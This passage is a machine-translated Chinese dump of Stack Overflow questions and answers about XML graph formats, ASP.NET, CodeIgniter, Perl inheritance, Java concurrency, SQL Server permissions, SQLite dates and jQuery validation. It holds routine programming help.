        <vertexproperty>
          <name>p2</name>
          <value>v2</value>
        </vertexproperty>
      </vertexproperties>
    </vertex>
  </vertices>
  <edges>
    <edge>
      <startingVertex>foo<endVertex>
      <endingVertex>bar<endingVertex>
    </edge>
  </edges>
</graph> 
```

这对`<vertexproperties>`有用`</vertexproperties>`吗？为什么？

还有其他建议吗？

我是 XML 和图形计算的新手。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T22:20:32.337

您可以看看[gephi](https://gephi.org/)在图形格式上所做的比较：

[https://gephi.org/users/supported-graph-formats/](https://gephi.org/users/supported-graph-formats/)

[Gefx](http://gexf.net/format/schema.html)是推荐的，似乎符合您的要求。无论如何，其他一些可能也对你有用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T08:22:21.363

如果您的主要目标是直观地呈现图形，请查看 DotML，它是 GraphViz 使用的点语言的 XML 语法。

我不是抽象属性语法的忠实粉丝，即像这样的元素

```
<property name="foo" value="bar"/> 
```

XML 被设计为可扩展的，所以为什么不使用

```
<foo>bar</foo> 
```

人们使用第一种形式的一个原因是他们认为他们可以编写一个“更紧密”的模式来保持它的有效性。但是您也可以为后一种形式编写模式（使用通配符），它同样有用。

# vb.net - 尝试添加到超链接字段的导航 url 时出错

> ID：10218861
> 
> 赞同：0
> 
> 时间：2012-04-18T22:14:21.023
> 
> 标签：vb.net, gridview, hyperlink

我正在尝试在超链接字段中添加导航 url。

我的 gridview 上有 5 列，最后一个是

```
 <asp:HyperLinkField DataNavigateUrlFields="vID" 
            DataNavigateUrlFormatString="Page2.aspx?field={0}" HeaderText="send" 
            Text="send"></asp:HyperLinkField> 
```

以及后面要添加的代码

```
Protected Sub GridView1_RowDataBound(ByVal sender As Object, ByVal e As System.Web.UI.WebControls.GridViewRowEventArgs) Handles GridView1.RowDataBound

    Dim hk As HyperLink = DirectCast(e.Row.Cells(4).Controls(0), HyperLink)
    hk.NavigateUrl += "&TN=table1"

End Sub 
```

我昨天让它工作了，但一定是不小心删除了代码，在这里我找不到哪里出错了，我收到一个错误“指定的参数超出了有效值的范围。参数名称：索引”

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T22:48:00.700

您必须检查[`RowType`](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.gridviewrow.rowtype.aspx)，否则您`HyperLink`还要在标题中寻找 。

VB

```
Protected Sub GridView1_RowDataBound(sender As Object, e As GridViewRowEventArgs )
    If e.Row.RowType = DataControlRowType.DataRow Then
        Dim link = DirectCast(e.Row.Cells(4).Controls(0), HyperLink)
        link.NavigateUrl &= "&TN=table1"
    End If
End Sub 
```

C＃

```
protected void GridView1_RowDataBound(object sender, GridViewRowEventArgs e)
{
    if (e.Row.RowType == DataControlRowType.DataRow)
    {
        HyperLink link = (HyperLink)e.Row.Cells[4].Controls[0];
        link.NavigateUrl += "&TN=table1";
    {
} 
```

# php - 如何在 CodeIgniter 中禁用自定义 URL？

> ID：10218868
> 
> 赞同：1
> 
> 时间：2012-04-18T22:14:58.077
> 
> 标签：php, codeigniter, routing, codeigniter-2

我讨厌它所在的codeigniter自定义网址：domain.com/controller/action/id

我怎样才能像普通网站一样拥有它：domain.com/controller.php

有谁知道如何禁用它？

（使用最新的codeigniter）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T22:29:02.310

如果你讨厌它，你可能还没有准备好跳入像 codeigniter 这样的框架。Rest like urls 是一个很大的特性，所以 url 有一些实际意义，而不仅仅是一个指针。如果你习惯了类似的东西也没关系`example.com/person.php?id=123&action=seeprofile`，`example.com./person/profile/123`但你怎么看不到它的美丽？你应该看看一些专家解释为什么你应该这样做，以及为什么其他人都这样做。

编辑：您应该查看文档的此页面，以便您了解这个强大功能的简洁性。

[http://codeigniter.com/user_guide/general/controllers.html#passinguri](http://codeigniter.com/user_guide/general/controllers.html#passinguri) [http://codeigniter.com/user_guide/general/routing.html](http://codeigniter.com/user_guide/general/routing.html) [http://codeigniter.com/user_guide/libraries/uri.html](http://codeigniter.com/user_guide/libraries/uri.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T22:20:22.430

来自 CI 文档： [http ://codeigniter.com/user_guide/general/urls.html](http://codeigniter.com/user_guide/general/urls.html)

添加 URL 后缀

在您的 config/config.php 文件中，您可以指定将添加到 CodeIgniter 生成的所有 URL 的后缀。例如，如果一个 URL 是这样的：

example.com/index.php/products/view/shoes 您可以选择添加后缀，例如 .html，使页面看起来是某种类型：

example.com/index.php/products/view/shoes.html

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-18T23:07:38.397

我不明白你想要达到什么目的。您可能会说您“讨厌自定义 url”，但这实际上是框架 .. 工作原理的基本部分。

如果你真的不喜欢它们，那么你需要研究[路由](http://codeigniter.com/user_guide/general/routing.html)，以及它在 codeigniter 上下文中是如何工作的。**不**使用控制器方法 id 模式有一个非常非常好的论据，我也支持它，但事实并非如此。国际化，只为一件事。

无论如何，在域名中添加 file.php 或 my-pro-script.php 对我们这些网站的用户来说完全无关紧要，他们根本不在乎 .php 扩展名。你想要这样做的理由是什么？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-19T10:37:49.433

config.php 文件中有选项**enable_query_strings**，可能就是您想要的...您可以通过将此选项设置为 TRUE 来启用基于标准查询字符串的 URL。

# java - 如何验证多对一关系的约束？

> ID：10218870
> 
> 赞同：0
> 
> 时间：2012-04-18T22:15:02.837
> 
> 标签：java, crud, playframework-2.0, ebean

我有两个具有`1:n`关系的模型，并且想使用表单验证器。

如果我从 select 中选择一个选项，则元素的正确 id 将存储在数据库中。
但是如果我离开它`-- Choose a game--`，*`NULL`*虽然游戏属性被注释了，但它被存储`@Constraints.Required`。

## 楷模

```
@Entity
public class Server extends Model {

    @Id
    public Integer serverId;

    @ManyToOne
    @Constraints.Required
    public Game game;

    ...
} 
```

```
@Entity
public class Game extends Model {

    @Id
    @Constraints.Required
    public Integer gameId;

    @Constraints.Required
    public String name;

    public static Map<String,String> options() {
        LinkedHashMap<String,String> options = new LinkedHashMap<String,String>();

        for(Game c: Game.find.orderBy("name").findList()) {
            options.put(c.gameId.toString(), c.name);
        }

        return options;
    }

    ...
} 
```

## 控制器

```
public static Result create() {
    return ok(views.html.Server.create.render(form(models.Server.class)))
} 
```

## 模板

```
@helper.select(form("game.gameId"), helper.options(Game.options), '_default -> "-- Choose a game --") 
```

* * *

我已经尝试使用注释在绑定过程中`@Valid`强制`play.data.Form`验证-Model ，但这只会导致对未填充的属性约束进行简单评估。虽然从列表中选择了正确的游戏，但它给了我一个空的错误：`Game``Game``name`

```
@Entity
public class Server extends Model {

    @ManyToOne
    @Constraints.Required
    @Valid
    public Game game;

    @Constraints.Required
    public String name;

... 
```

* * *

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T07:57:20.673

我通过编写这样的`validate()`方法解决了这个问题：

```
public boolean validate() {
    return Game.gameId != null
} 
```

我还查看了 Spring Binding 文档，因为 Play2.0 Java 使用 Spring Binder。在第 17.2.4.11 章（[链接](http://static.springsource.org/spring/docs/current/spring-framework-reference/html/view.html#view-jsp-formtaglib-optionstag)）中，他们为默认选项提供了值“-”。没有测试过，但它可能是解决方案。

# linux - 将大量文件打印成pdf

> ID：10218875
> 
> 赞同：0
> 
> 时间：2012-04-18T22:15:35.143
> 
> 标签：linux, bash, shell, unix, ubuntu

嘿伙计们，我需要打印一个我用 C 语言编写的 PDF 格式的项目，问题是我有很多文件位于不同的目录中，我不想使用 Ubuntu 文本编辑器一个一个地打印它。

我做了一些研究，发现我需要将 lpr shell 推荐与 cat（递归）一起使用，但我不明白如何使用它打印到 PDF。

任何人都可以帮助我吗？

编辑1：

当我尝试做类似 cat * | 的事情时 lpr - P PDF 我收到下一个错误： lpr：打印机或类不存在。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-18T23:06:18.653

你可以安装 cups-pdf 然后做

cat 文件名.c | lpr -P PDF

这会在您的 ~/PDF 中放置一个 pdf 文件

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-21T23:22:01.397

试试[a2ps](http://www.gnu.org/s/a2ps/)。

> GNU a2ps 是一个 Any to PostScript 过滤器。当然，它处理纯文本文件，但也漂亮地打印了相当多的流行语言。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-22T19:06:37.700

你也可以看看`enscript`程序。

# perl - 在进行本地子例程调用时指定包名称是否有危险？

> ID：10218876
> 
> 赞同：0
> 
> 时间：2012-04-18T22:15:45.317
> 
> 标签：perl

我继承了类似于下面显示的 Perl 代码。包包含公共子例程，不导入也不导出命名空间。这种调用约定似乎不典型。重构是一种选择。

我有兴趣了解在当前包中调用子例程时显式命名包的风险/副作用。提前致谢。

```
package Util;
sub _step1 {
    # <code>
}
sub _step2 {
    # <code>
}
sub doWork {
   Util::_step1();
   Util::_step2();
}
1; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T02:11:59.783

有趣的。我在想这将如何影响继承。

想象一个`Util`覆盖`_step1`and`_step2`方法的类的子类。如果那个类调用了`dowork`方法。它不会调用子类`_step1`和`_step2`方法，而是调用父类`_step1`和`_step2`方法。

# 附录

> 函数调用忽略继承。该模块需要执行诸如 Util->_step1() 或**package** ->_step1() 之类的操作才能使继承变得重要，即使这样，包搜索也将从 Util 开始，而不是子类。– 文达苏

真的吗？似乎很简单，可以测试。

我有两个包：`Local::Util`并`Local::Util::Child`在我的程序中定义。Local::Util::Child 是`Local::Util`.

类`Local::Util`定义了以下构造函数和方法：

*   `new`：创建该类的新对象
*   `_step1`
*   `_step2`
*   `doWork`：这调用`_step1`和前缀。`_step2``Util::`
*   `doWork2`: 这个调用`_step1`并且`_step2`没有`Util::`前缀。
*   `doWork3`：这调用`_step1`和前缀。`_step2``__PACKAGE__`
*   `doWork4`:这称为`_step1`and前缀取自`_step2`.`$class``ref`

类`Local::Util::Child`只重新定义`_step2`方法。

这是程序：

```
#! /usr/bin/env perl
#
use strict;
use warnings;
use feature qw(say);

# This is our basic Local::Util object manipulation

my $util_obj = Local::Util->new;
say q("$util_obj" is a member of the ") . ref($util_obj) . q(" class);

print q($util_obj->_step1: );
$util_obj->_step1;

print q($util_obj->_step2: );
$util_obj->_step2;

# This is a child class object of the above

my $uc_obj = Local::Util::Child->new;
say q("$uc_obj" is a member of the ") . ref($uc_obj) . q(" class);

# Calls to straight forward methods

print q($uc_obj->_step1: );
$uc_obj->_step1;

print q($uc_obj->_step2: );
$uc_obj->_step2;

# Now calls to methods that call other methods

say qq(\n=====\$util_obj->doWork=====);
$util_obj->doWork;

say qq(\n=====\$uc_obj->doWork=====);
$uc_obj->doWork;

say qq(\n=====\$util_obj->doWork2=====);
$util_obj->doWork2;

say qq(\n=====\$uc_obj->doWork2=====);
$uc_obj->doWork2;

say qq(\n=====\$util_obj->doWork3=====);
$util_obj->doWork3;

say qq(\n=====\$uc_obj->doWork3=====);
$uc_obj->doWork3;

say qq(\n=====\$util_obj->doWork4=====);
$util_obj->doWork4;

say qq(\n=====\$uc_obj->doWork4=====);
$uc_obj->doWork4;

###################################################
# Package Local::Util
#
package Local::Util;

sub new {
    my $class = shift;
    my $self = {};
    bless $self, $class;
}

sub _step1 {
    say "I'm calling Local::Util::_step1";
}

sub _step2 {
    say "I'm calling Local::Util::_step2";
}

sub doWork {
    Local::Util::_step1();
    Local::Util::_step2();
}

sub doWork2 {
    _step1();
    _step2();
}

sub doWork3 {
    __PACKAGE__->_step1();
    __PACKAGE__->_step2();
}

sub doWork4 {
    my $self = shift;
    my $class = ref $self;

    $class->_step1();
    $class->_step2();
}
#
#############################################

#############################################
# Package Local::Util::Child
#

package Local::Util::Child;
use base qw(Local::Util);

sub _step2 {
    say "I'm calling Local::Util::Child::_step2";
} 
```

而且，这是输出：

```
"$util_obj" is a member of the "Local::Util" class
$util_obj->_step1: I'm calling Local::Util::_step1
$util_obj->_step2: I'm calling Local::Util::_step2
"$uc_obj" is a member of the "Local::Util::Child" class
$uc_obj->_step1: I'm calling Local::Util::_step1
$uc_obj->_step2: I'm calling Local::Util::Child::_step2

=====$util_obj->doWork=====
I'm calling Local::Util::_step1
I'm calling Local::Util::_step2

=====$uc_obj->doWork=====
I'm calling Local::Util::_step1
I'm calling Local::Util::_step2

=====$util_obj->doWork2=====
I'm calling Local::Util::_step1
I'm calling Local::Util::_step2

=====$uc_obj->doWork2=====
I'm calling Local::Util::_step1
I'm calling Local::Util::_step2

=====$util_obj->doWork3=====
I'm calling Local::Util::_step1
I'm calling Local::Util::_step2

=====$uc_obj->doWork3=====
I'm calling Local::Util::_step1
I'm calling Local::Util::_step2

=====$util_obj->doWork4=====
I'm calling Local::Util::_step1
I'm calling Local::Util::_step2

=====$uc_obj->doWork4=====
I'm calling Local::Util::_step1
I'm calling Local::Util::Child::_step2 
```

有趣的。你说得对，我是否放`Util::`前缀都没有区别，它仍然调用父方法而不是子方法。放置`__PACKAGE__`前缀也是如此（我认为您应该如何做以确保您正在调用当前类的定义）。我能让孩子工作的唯一方法是使用`$class`我必须从`ref`命令中获得的前缀。

因此，似乎如果您在另一个方法中调用一个方法，它将默认为该类的方法而不是子类的方法。我想这是有道理的——尤其是因为它看起来像是私有方法`_step1`，`_step2`不应该在父方法之外访问。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T19:05:16.873

没关系。唯一的缺点是，如果重命名模块，您可能会忘记重命名子调用。

但这是一件奇怪的事情。如果您告诉我们您想要这样做的原因，我们也许可以提供更好的方法来做到这一点。

# objective-c - 如何连接到基类中的 IBOutlet 或 IBAction

> ID：10218877
> 
> 赞同：26
> 
> 时间：2012-04-18T22:15:46.263
> 
> 标签：objective-c, ios, uiviewcontroller, interface-builder

我有一个继承自基类的基视图控制器类`UIViewController`和一个继承自基类的`viewcontroller`类。现在我有一个 nib，其文件所有者是继承的类，但我所有的操作和出口都在基类中。甚至可以将 nib 文件中的 action\outlet 连接到基类中的 action\outlet 吗？

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2014-03-08T06:40:22.007

我将基本上通过[示例](https://github.com/abbood/IBOutlet-inheritance)来解释它：

定义一个基类（我们称之为`BaseViewController`）并在 .h 文件中为其分配一个`UITableView`IBoutlet：

```
//  BaseViewController.h
@interface BaseViewController : UIViewController    
@property (weak, nonatomic) IBOutlet UITableView *tableView;    
@end 
```

定义两个子类（即`FirstChildViewController`和`SecondChildViewController`）：

```
// FirstChildViewController.h
@interface FirstChildViewController : BaseViewController
@end

// SecondChildViewController.h
@interface SecondChildViewController : BaseViewController
@end 
```

现在要使子类中的一个（或两个）使用基类的 iboutlet，只需将引用出口拖到基类 .h 文件中的属性定义中即可。就是这样！

![在此处输入图像描述](../Images/7d26843f1ff4202e04de692641fd18ea.png)

[这](https://github.com/abbood/IBOutlet-inheritance)是一个完整的项目来说明这一点。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-04-18T22:22:35.773

有两种方法可以做到这一点：

1)

以编程方式进行（即在代码中）

首先在基类中声明您的网点。

然后通过继承类中的代码分配您的网点。

和

2)

您还可以在您的 XIB 文件中分配您的出口和操作。Xcode 知道从基类继承的出口和动作。

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2015-11-20T19:22:59.617

如果基类在 Swift 框架中，那么有时 Xcode 7 将看不到 outlet，即使基类及其 outlet 是公共的。在这种情况下，解决方法如下：

1.  在 IB 中将控件设置为使用基类
2.  连接插座
3.  在 IB 中将控件设置为使用派生类

IB 将显示“！” 旁边的插座就好像它们丢失了一样，但运行时不会出现错误。

如果有人有更好的解决方法，请告诉我！

# java - 防止并发修改异常的最佳方法

> ID：10218883
> 
> 赞同：5
> 
> 时间：2012-04-18T22:16:17.190
> 
> 标签：java, multithreading, list, concurrency, concurrentmodification

下面是一些伪代码。

```
public class MyObject
{   
    private List<Object> someStuff;
    private Timer timer;

    public MyObject()
    {
        someStuff = new ArrayList<Object>();

        timer = new Timer(new TimerTask(){

            public void run()
            {
                for(Object o : someStuff)
                {
                    //do some more stuff involving add and removes possibly
                }
            }
        }, 0, 60*1000);
    }

    public List<Object> getSomeStuff()
    {
        return this.someStuff;
    }
} 
```

所以本质上问题是上面代码中没有列出的其他对象调用 getSomeStuff() 来获取列表以用于只读目的。发生这种情况时，我在计时器线程中收到并发修改异常。我尝试使 getSomeStuff 方法同步，甚至尝试在计时器线程中同步块，但仍然不断收到错误。停止并发访问列表的最简单方法是什么？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-18T22:20:50.880

在迭代线程中的列表之前，您可以使用`java.util.concurrent.CopyOnWriteArrayList`或制作副本（或使用方法获取数组）。`Collection.toArray`

除此之外，在 for-each 构造中删除会破坏迭代器，因此在这种情况下它不是处理列表的有效方法。

但您可以执行以下操作：

```
for (Iterator<SomeClass> i = list.iterator(); i.hasNext();) {
    SomeClass next = i.next();
    if (need_to_remove){
       i.remove(i);                
    }
} 
```

或者

```
for (int i = list.size() - 1; i >= 0; i--){            
    if (need_to_remove) {
        list.remove(i);                
    }
} 
```

另请注意，如果您的代码从不同的线程访问列表并且列表被修改，则需要同步它。例如：

```
 private final ReadWriteLock lock = new ReentrantReadWriteLock();

    final Lock w = lock.writeLock();
    w.lock();
    try {
        // modifications of the list
    } finally {
        w.unlock();
    }

      .................................

    final Lock r = lock.readLock();
    r.lock();
    try {
        // read-only operations on the list
        // e.g. copy it to an array
    } finally {
        r.unlock();
    }
    // and iterate outside the lock 
```

但请注意，带锁的操作应尽可能短。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-18T22:23:26.360

您应该在 中制作列表的副本`getSomeStuff()`。像这样发布对私有字段的引用会使其有效地公开，因此无论如何您都不想这样做。

此外，请考虑将副本作为[`ImmutableList`](http://google-collections.googlecode.com/svn/trunk/javadoc/com/google/common/collect/ImmutableList.html)或至少作为不可[修改的列表](http://docs.oracle.com/javase/6/docs/api/java/util/Collections.html#unmodifiableList%28java.util.List%29)返回。

# python - pyparsing operatorprecedence 解析空查询

> ID：10218886
> 
> 赞同：3
> 
> 时间：2012-04-18T22:16:32.337
> 
> 标签：python, pyparsing, operator-precedence

我正在使用 pyparsing.operatorprecedence 来解析中缀表示法查询。代码是

```
 filterExpr = pp.quotedString.setParseAction(pp.removeQuotes) |\
                 pp.Word(pp.printables, excludeChars="()")

searchTerm = (~and_ + ~or_ + ~not_) + filterExpr

searchExpr = pp.operatorPrecedence(
                searchTerm,
                [
                (not_, 1, pp.opAssoc.RIGHT, SearchNotOperation),
                (pp.Optional(and_, default="AND"), 2, pp.opAssoc.LEFT, SearchAndOperation),
                (or_, 2, pp.opAssoc.LEFT, SearchOrOperation),
                ]) 
```

这会解析像 '(foo bar) 或 baz' 这样的表达式，但在提供空字符串或空括号 '()' 的边缘情况下会失败。我该如何解决这个问题？

# c# - 简单的 ftp 下载器/http 代理

> ID：10218891
> 
> 赞同：2
> 
> 时间：2012-04-18T22:17:36.033
> 
> 标签：c#, asp.net, .net

对于我正在处理的项目，我需要提供对我只有 ftp 访问权限的文件的 http 访问权限。这是一个需要下载文件但只支持http的外部服务。我在下面尝试了这段代码：但是 CPU/内存使用率很高，它慢慢地死掉了。有什么建议么？

```
using System;
using System.Web;
using System.Net;
using System.IO;

public class ftpproxy : IHttpHandler
{
    // ftpproxy.ashx?src=ftp://username:password@server.com/staticfiles/foo.f4v
    public void ProcessRequest (HttpContext context) {
        WebClient wc = new WebClient();
        string src = context.Request.QueryString["src"];
        using (Stream instr = wc.OpenRead(src))
        {
            instr.CopyTo(context.Response.OutputStream);
        }
    }

    public bool IsReusable {
        get {
            return false;
        }
    }

} 
```

谢谢！

哦，这些都是大文件（几百兆到几场演出）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-25T12:30:53.723

您可以做的是使用来自响应的 WebClient 端 WriteFile 的 DownloadFile 方法。

```
string src = context.Request.QueryString["src"];
var file = "X:\TEMP\TempFile...";
WebClient client = new WebClient();
client.DownloadFile(src, file);

Context.Response.WriteFile(file);

//Write code to clean File; 
```

# java - 替代 Java 的 Observable 类？

> ID：10218895
> 
> 赞同：20
> 
> 时间：2012-04-18T22:17:42.207
> 
> 标签：java, events, observer-pattern, observable

`event`我从 C# 世界来到 Java，其中观察者模式被实现为带有关键字的一流语言结构。

我看到 Java`Observable`从早期就有这个类，但它显然存在实现问题并且似乎没有被广泛使用。到目前为止，我只是在我的 Java 代码中滚动我自己的观察者模式实现，但我总是忍不住认为必须有一个更好的替代方案来总是输出这个样板代码。Swing 中有 Listener 类，但它们似乎不适用于非 Swing 代码。

对于这个非常常见的问题，推荐的解决方案是什么？第三方库对我来说没问题。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-04-18T22:32:01.003

通常，观察者模式在需要时使用临时解决方案来实现。当涉及到行为模式时，它是最简单的模式之一：控制“观察者”列表的两种方法，以及一种在发生有趣事情时通知观察者的方法。

观察者模式往往很少出现在某些领域之外，而且当它确实出现时，它往往过于特定于应用程序领域，因此通用解决方案没有什么价值。您可以看到`java.util.Observable`该类的问题：如果您继承自`Observable`您必须接受可能传递给您的所有可能类型的“观察者”，这可能对您的应用程序没有意义：

*   如果您的对象可以产生两种不同类型的事件，因此需要两个不同的观察者列表怎么办？
*   如果观察者可能会根据事件影响您的对象，例如通过否决更改，该怎么办？

也就是说，[来自 Google Guava 的 EventBus](https://github.com/google/guava/wiki/EventBusExplained)似乎在简化事件生成和处理方面做得很好，它采用了一种完全不同的方法。

之前在 SO 上已经讨论过其他[基于注释的技术](https://stackoverflow.com/questions/178700/generic-annotation-driven-event-notification-frameworks)。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-09-17T13:59:06.247

我建议研究[反应式编程](http://www.introtorx.com/Content/v1.0.10621.0/00_Foreword.html)。Java 只有一种我知道的实现：[reactive4java](https://code.google.com/p/reactive4java/)。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-18T22:30:54.780

[本文](http://www.theserverside.com/news/1364408/Spring-Loaded-Observer-Pattern)展示了使用 Spring Framework 的模式的一个很好的实现。你仍然需要定义你的 Subject 和 Observer 接口（和实现），但是 Spring 通过 XML 配置处理 Observer 向 Subjects 的注册。

# sql - 创建只能看到一个数据库的用户，并且只能从中选择？

> ID：10218897
> 
> 赞同：8
> 
> 时间：2012-04-18T22:17:51.037
> 
> 标签：sql, sql-server, sql-server-2008, tsql, sql-server-2008-r2

我们在 SQL 服务器上有几个数据库。我们想创建 1 个可以看到数据库“c”但看不到其余数据库的新用户。

该用户应该只能从该数据库中进行选择，而不能进行其他选择。
我一直在谷歌搜索和搜索一段时间，我发现最接近的是拒绝查看任何数据库，然后让他们成为数据库所有者。

但我认为这不会限制他们选择，除非有办法我可以拒绝除了数据库所有者的选择之外的一切？

提前感谢您的帮助！

编辑：顺便说一句，SQL Server 2008 R2。

Edit2：对不起，我在原始帖子中不清楚。我希望做到这一点，这样当他们登录时，他们甚至不会看到其他数据库的名称，而不仅仅是他们无法访问它们。

谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-18T22:27:17.170

1）在服务器上创建用户

2）将用户添加到给定的数据库

3) 授予对数据库的只读访问权限

```
USE [master]
CREATE LOGIN [SomeUserName] WITH PASSWORD=N'someStr0ngP@ssword', DEFAULT_DATABASE=[c], DEFAULT_LANGUAGE=[us_english], CHECK_EXPIRATION=ON, CHECK_POLICY=ON
GO

USE [c]
CREATE USER [SomeUserName] FOR LOGIN [SomeUserName] WITH DEFAULT_SCHEMA=[dbo]
GO

EXEC sp_addrolemember N'db_datareader', N'SomeUserName' 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-18T22:33:49.960

在权限方面，deny 是默认行为，因此，如果您创建用户并将其添加到必要数据库上的 db_datareader 角色中，那将是它拥有的唯一权限。它将无法访问其他数据库

编辑：

```
use [master]
GO
DENY VIEW ANY DATABASE TO [login]
GO
use [master]
GO
DENY VIEW SERVER STATE TO [login]
GO 
```

这将删除登录名查看数据库的能力。然后去你想让他看到的那个，让他成为那个数据库的所有者

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-06-24T13:37:04.853

步骤 1：创建登录

步骤2：从登录中删除所有数据库查看权限

```
deny view any database to LogInName 
```

Step-3：授予数据库登录权限

```
alter authorization on database:: DataBaseName to LogInName 
```

注意：不需要用单引号指定用户名或数据库名称

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-06-18T22:56:12.953

也许这会奏效。

将用户添加到服务器并映射到正确的数据库。从服务器中删除用户。

服务器将通知您删除服务器用户不会删除与此登录关联的数据库用户。

单击确定，您将拥有只能访问一个数据库的用户。

# apache-flex - Flex Mobile 4.6 Sqlite 日期范围查询在 Flex/Flash Builder 内或设备上不起作用

> ID：10218902
> 
> 赞同：1
> 
> 时间：2012-04-18T22:18:06.187
> 
> 标签：apache-flex, mobile, actionscript, sqlite

我正在开发的应用程序允许用户创建特定日期的日志。我正在尝试基于某个日期范围撤回信息。

这是创建表格的代码（为了这篇文章的目的而精简）：

```
CREATE TABLE IF NOT EXISTS TimeLogged(
    ...
    LogDate DATE NOT NULL
); 
```

用于将日期插入表中的代码是：

```
INSERT INTO TimeLogged (LogDate) VALUES (date('2012-01-14')); 
```

这是我用来获取日期范围的查询：

```
SELECT LogDate FROM TimeLogged WHERE LogDate BETWEEN date('2012-01-01') AND date('2012-04-16') 
```

它可以在 Sqlite 命令行窗口中完美运行。这是一个链接，因为我太新而无法发布 pix： [Sqlite Command Window](http://www.planetlizard.com/so/cmd.png)

这是我在 Flex/Flash Builder 4.6 中用于获取结果的代码：

```
 var stmt:SQLStatement = new SQLStatement();
            stmt.sqlConnection = SQLCom.SQLCon;
            stmt.text = "SELECT LogDate FROM TimeLogged WHERE LogDate BETWEEN date('2012-01-01') AND date('2012-04-16')";
            try{
                stmt.execute();
            }
            catch(err:SQLError){
                trace(err.details);
            }

            var a:ArrayCollection = new ArrayCollection(stmt.getResult().data);

            trace("a.length: " + a.length);

            for(var i:int = 0; i < a.length; ++i)
                trace("a[" + i + "]: " + a[i].LogDate); 
```

即使有多条记录，我也没有得到任何结果。

这是我在删除 WHERE/BETWEEN 语句时在控制台输出中得到的内容： [Flex/Flash Builder 控制台输出](http://www.planetlizard.com/so/flex.png)

提前感谢任何可以阐明我的问题的人。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T17:17:50.353

我发现了一些有用的东西。我创建了一个函数来将 UTC 日转换为儒略日：

```
protected function UTCToJulianDay(d:Date):Number {
    return ((( d.time - (d.getTimezoneOffset() * 60000))  / 86400000) + 2440587.5);
} 
```

然后我只是通过函数运行每个日期对象：

```
var d:Date = new Date();
d.setTime(d.getTime() - (86400000 * 7));// first day is one week prior

var d1:Number = UTCToJulianDay(d);
var d2:Number = UTCToJulianDay(new Date()); 
```

因此，日期对象只需按如下方式进入查询（请参阅原始帖子以获取完整代码）：

```
stmt.text = "SELECT LogDate FROM TimeLogged WHERE LogDate BETWEEN " + d1 + " AND " + d2; 
```

# jquery - 带有验证的奇怪脚本结果

> ID：10218908
> 
> 赞同：-2
> 
> 时间：2012-04-18T22:18:40.513
> 
> 标签：jquery, forms, validation

我有一个运行良好的脚本，但我有一个小问题。

我刚刚添加到我的脚本中：

```
 if (isError) {
            $('html, body').animate({
                scrollTop: 0
            }, 2500);
        } else {
            $("#error-div").hide();
        } 
```

现在我有一个问题。当我在输入中键入内容时，最后一个输入验证集 $('#input_1 input') 隐藏了错误 div。所有其他输入都是红色的，背景发生了变化，但是error-div消失了——只有当我从#input1中删除错误时，这是​​脚本中的最后一个。

如果仅在该输入中没有错误，则最后一个输入将关闭 div 错误。

想不通。任何建议都会很棒。

```
$(function () {
$('#rbSubmit').formValidator({
    scope: '#form_register',
    onError: function () {
        var isError = false;
        if ($('#input_38 textarea').hasClass('error-input')) {
            isError = true;
            $('#r38 div').css('background-color', '#C1272D').css('color', '#FFF');
            $("#error-div").show();
        } else {
            $('#r38 div').css('background-color', '#2F2F2F');
            $("#error-div").hide();
        }
        if ($('#input_39 input').hasClass('error-input')) {
            isError = true;
            $('#r39 div, #r39 input').css('background-color', '#C1272D').css('color', '#FFF');
            $("#error-div").show();
        } else {
            $('#r39 div').css('background-color', '#2F2F2F');
            $("#error-div").hide();
        }

       // LAST DIV ALONE WILL TURN OFF THE div-error!!!  HELP!!!

        if ($('#input_1 input').hasClass('error-input')) {
            isError = true;
            $('#r1 div, #r1 input').css('background-color', '#C1272D').css('color', '#FFF');
            $("#error-div").show();
        } else {
            $('#r1 div').css('background-color', '#2F2F2F');
            $("#error-div").hide();
        }
        if (isError) {
            $('html, body').animate({
                scrollTop: 0
            }, 2500);
        } else {
            $("#error-div").hide();
        }
    }
});
}); 
```

​</p>

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-18T22:21:53.080

尝试为 error-div 提供比其他输入更高的 z-index：

[http://coding.smashingmagazine.com/2009/09/15/the-z-index-css-property-a-comprehensive-look/](http://coding.smashingmagazine.com/2009/09/15/the-z-index-css-property-a-comprehensive-look/)

请注意，您必须指定一个位置属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T22:34:14.963

你为什么要执行 $("#error-div").show(); 和 $("#error-div").hide(); 在每个 if else 块内？当然，如果检测到错误，您可以在最后执行它：

```
if (isError) {
    $('html, body').animate({
        scrollTop: 0
    }, 2500);
    $("#error-div").show();
} else {
    $("#error-div").hide();
} 
```

您使用什么 jQuery 插件进行验证？

# php - 访问复选框表中的相应数据

> ID：10218909
> 
> 赞同：1
> 
> 时间：2012-04-18T22:19:00.990
> 
> 标签：php, javascript, mysql, html, checkbox

